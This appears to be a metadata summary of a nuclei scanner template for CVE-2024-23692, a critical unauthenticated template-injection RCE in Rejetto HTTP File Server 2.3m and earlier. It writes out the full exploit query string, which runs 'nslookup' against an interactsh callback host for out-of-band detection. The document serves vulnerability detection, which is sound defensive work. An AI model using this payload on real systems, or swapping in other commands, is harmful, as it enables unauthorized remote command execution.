---
cve_id: CVE-2024-23692
template_path: nuclei-templates/http/cves/2024/CVE-2024-23692.yaml
affected_product: Rejetto HTTP File Server
severity: critical
authentication: none
external_callback: true
affected_versions: <= 2.3m
preconditions: []
poc_classification: rce
---

## Vulnerability
Rejetto HTTP File Server is vulnerable to template injection. This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request. Unauthenticated attackers can execute arbitrary commands on the Rejetto HTTP File Server through template injection, potentially compromising the entire system.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8) | CWE-1336

## PoC / Detection
Classification: rce

The template sends a single GET request to the root endpoint with a crafted query string containing the payload `?n=%0A&cmd=nslookup+{{interactsh-url}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}` that triggers template execution of the `nslookup` command. Detection relies on observing an out-of-band DNS interaction via interactsh and the presence of the string "rejetto" in the response body.

## References
- https://github.com/rapid7/metasploit-framework/pull/19240
- https://mohemiv.com/all/rejetto-http-file-server-2-3m-unauthenticated-rce/
